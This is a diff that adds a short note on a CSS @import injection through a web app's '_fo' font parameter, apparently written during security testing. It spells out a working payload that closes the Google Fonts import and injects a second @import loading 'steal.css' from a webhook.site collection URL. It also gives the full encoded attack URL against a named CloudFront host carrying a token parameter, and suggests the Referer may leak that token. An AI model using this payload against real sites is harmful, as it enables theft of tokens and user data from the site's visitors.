@@ -1,0 +1,18 @@
+@import Attack Vector
+======================
+
+The @import happens in the _fo parameter. Let's inject a second @import that loads from attacker:
+
+Normal CSS generated:
+@import url('https://fonts.googleapis.com/css2?family=${_fo}');
+
+Payload for _fo:
+x');@import url('https://webhook.site/b5c348fc-bed5-4718-a19c-b9d55e537749/steal.css
+
+Generated CSS:
+@import url('https://fonts.googleapis.com/css2?family=x');@import url('https://webhook.site/b5c348fc-bed5-4718-a19c-b9d55e537749/steal.css');
+
+Full Attack URL:
+https://d2pneqdaei3b3x.cloudfront.net/index.html?_to=eyJUT0tFTl9IRVJFfQ&_fo=x%27%29%3B%40import%20url%28%27https%3A%2F%2Fwebhook.site%2Fb5c348fc-bed5-4718-a19c-b9d55e537749%2Fsteal.css&_fn=test
+
+The @import request might have full Referer since it's a CSS resource load, not a subresource!
